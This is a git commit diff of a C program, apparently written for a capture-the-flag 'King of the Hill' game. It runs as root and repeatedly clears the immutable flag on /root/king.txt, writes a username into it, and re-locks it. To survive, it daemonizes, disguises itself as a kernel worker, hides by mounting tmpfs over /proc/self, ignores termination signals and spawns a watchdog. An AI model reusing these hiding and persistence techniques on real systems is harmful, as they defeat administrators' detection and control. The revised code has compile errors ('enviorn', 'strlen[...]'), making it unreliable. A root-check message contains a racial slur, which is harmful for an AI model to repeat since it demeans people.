7342078b572391a535879d90b5e467b07d0d3808
thefoulowl <thefoulowl@proton.me>
2026-01-23 23:50:17 +0530

    content updated

--- Binary_kits/binkit.c
+++ Binary_kits/binkit.c
@@ -1,114 +1,142 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <fcntl.h>
+#include <unistd.h>
 #include <sys/types.h>
 #include <sys/mount.h>
 #include <sys/prctl.h>
-#include <sys/ioctl.h>
 #include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
 #include <linux/fs.h>
+#include <errno.h>
+#include <signal.h>
 
-#define MASKED_NAME "[kworker/5:2]"	    // whatever name you want for the process
-#define TARGET_FILE "/root/king.txt"	    // path for wherever the file is
-#define TARGET_USER "your-username"	    // your username
-#define TARGET_PROCESS "/proc/self"
-#define TARGET_FILESYSTEM "tmpfs"
-#define MOUNT_FLAG 0                        // flag for new mount creation
-#define MOUNT_DATA NULL                     // manual says keep NULL
+#define TARGET_PROCESS "[kworker/0:5]"
+#define PROC_PATH "/proc/self"
+#define FS_TYPE "tmpfs"
+#define MOUNT_FLAG 0
+#define MOUNT_DATA NULL
+#define TARGET_PATH "/root/king.txt"
+#define USER_NAME "username"
 
-void Daemonize() {
+pid_t b_pid = -1;
 
+void daemonize(){
     pid_t pid;
 
-    // first fork
+    // first fork 
     pid = fork();
-    if (pid < 0) exit(EXIT_FAILURE);
-    if (pid > 0) exit(EXIT_SUCCESS);        // parent exists
+    if(pid < 0) exit(EXIT_FAILURE);
+    if(pid > 0) exit(EXIT_SUCCESS);     // parent exists
 
-    // create a new session
+    // independent session
     if (setsid() < 0) exit(EXIT_FAILURE);
 
     // second fork
     pid = fork();
-    if (pid < 0) exit(EXIT_FAILURE);
-    if (pid > 0) exit(EXIT_SUCCESS);        // first child exists
+    if(pid < 0) exit(EXIT_FAILURE);
+    if(pid > 0) exit(EXIT_SUCCESS);     // first child exists
 
-    // set file and dir perms
-    umask(022);                             // slightly safer than 0 xD
-    if (chdir("/") < 0) exit(EXIT_FAILURE); // change to root directory to detect any locked mounts
+    // set file perms
+    umask(022);
 
-    // close all file descriptors
-    // sysconf(_SC_OPEN_MAX) basically tells us how much fd can this process open, usually it is 1024
+    // checking for abnormal mounts
+    if(chdir("/") < 0) exit(EXIT_FAILURE);
+
+    // close every file descriptor that is opened
     long maxfd = sysconf(_SC_OPEN_MAX);
-    if (max < 0) maxfd = 1024;
-    for (int i = maxfd; i >= 0; i--) close (i);
+    if (maxfd < 0) maxfd = 1024;
+    for (int i = (int)maxfd; i >= 0; i--) close(i);
 
     // redirect stdin, stdout, stderr to /dev/null
-    int fd = open("/dev/null", O_RDWR);
-    dup2(fd, 0);                            // stdin
-    dup2(fd, 1);                            // stdout
-    dup2(fd, 2);                            // stderr
-}
-
-void MaskTheName(char **argv) {
-    // changing process name for ps or top
-    prctl(PR_SET_NAME, MASKED_NAME, 0, 0, 0);
-
-    // changing cli args shown in ps aux
-    memset(argv[0], 0, strlen(argv[0]));
-    strncpy(argv[0], MASKED_NAME, strlen(MASKED_NAME));
-
-    // mount /proc/self to tmpfs
-    if (mount(TARGET_FILESYSTEM, TARGET_PROCESS, TARGET_FILESYSTEM, MOUNT_FLAG, MOUNT_DATA) == 0) {
-        printf("Mount successful \n");
-    } else {
-        printf("error occurred while mounting tmpfs!\n");
-    }
-}
-
-void GetTheHill() {
     int fd;
-    int ImmutableAttribute = FS_IMMUTABLE_FL;
-    int ClearAttribute = 0;
 
-    // clear set attributes, if any, by someone else
-    fd = open(TARGET_FILE, O_RDONLY);
-    if (fd != -1) {
-        ioctl(fd, FS_IOC_SETFLAGS, &ClearAttribute);
+    fd = open("/dev/null", O_RDWR);
+    dup2(fd, 0);        // stdin
+    dup2(fd, 1);        // stdout
+    dup2(fd, 2);        // stderr
+}
+
+void MaskIt(char **argv){
+    // changing process name
+    prctl(PR_SET_NAME, TARGET_PROCESS, 0, 0, 0);
+
+    // wiping environment vars of the program
+    extern char **enviorn;
+    for(int i=0; environ[i] != NULL; i++) memset(environ[i], 0, strlen[enviorn[i]]);
+
+    // masking cli args
+    memset(argv[0], 0, strlen(argv[0]));
+    strncpy(argv[0], TARGET_PROCESS, strlen(TARGET_PROCESS));
+    
+    // mount tmpfs over /proc/self
+    if(mount(FS_TYPE, PROC_PATH, FS_TYPE, MOUNT_FLAG, MOUNT_DATA) != 0) exit(EXIT_FAILURE);
+}
+
+void GetTheHill(){
+    int fd;
+    int ImmutFlag = FS_IMMUTABLE_FL;
+    int ClearFlag = 0;
+
+    // clearing any locks
+    fd = open(TARGET_PATH, O_RDONLY);
+    if(fd != -1){
+    ioctl(fd, FS_IOC_SETFLAGS, &ClearFlag);
+    close(fd);
+    }
+
+    // writing in the file
+    fd = open(TARGET_PATH, O_WRONLY | O_TRUNC);
+    if(fd != -1){
+        write(fd, USER_NAME, strlen(USER_NAME));
         close(fd);
     }
 
-    // writing name in the file
-    fd = open(TARGET_FILE, O_WRONLY | O_TRUNC);
-    if (fd != -1) {
-        write(fd, TARGET_USER, strlen(TARGET_USER));
-        close(fd);
-    }
-
-    // locking the file with attribute +i, i.e., immutable
-    fd = open(TARGET_FILE, O_RDONLY);
-    if (fd != -1) {
-        ioctl(fd, FS_IOC_SETFLAGS, &ImmutableAttribute);
+    // locking the file again
+    fd = open(TARGET_PATH, O_RDONLY);
+    if(fd != -1){
+        ioctl(fd, FS_IOC_SETFLAGS, &ImmutFlag);
         close(fd);
     }
 }
 
-int main (int argc, char *argv[]) {
-    if (getuid() != 0) {
-        printf("Root privileges are required.\n");
-        return 1;
+// watchdog technique
+void SpawnThePartner(){
+    b_pid = fork();
+
+    if(b_pid < 0) return;               // fork failed
+    if(b_pid == 0) b_pid = getppid();   // b_pid is now the parent, this program is the child    
+}
+
+int main(int argc, char *argv[]){
+    if(getuid() != 0){
+        printf("root privileges needed negro!");
+        exit(EXIT_FAILURE);
     }
 
-    Daemonize();
-    MaskTheName(argv);
+    daemonize();
+    MaskIt(argv);
+
+    // ignore soft kill signals
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    // initial spawn
+    SpawnThePartner();
 
     // persistent loop
-    while (1) {
+    while(1){
+        // check if partner is alive
+        if(kill(b_pid, 0) == -1 && errno == ESRCH) SpawnThePartner();
+
+        // koth
         GetTheHill();
-        sleep(2);
+
+        // sleeping with a lil jitter for sync issues
+        usleep(1500000 + (rand() % 1000000));
     }
 
-    return 0;
+    return EXIT_SUCCESS;
 }
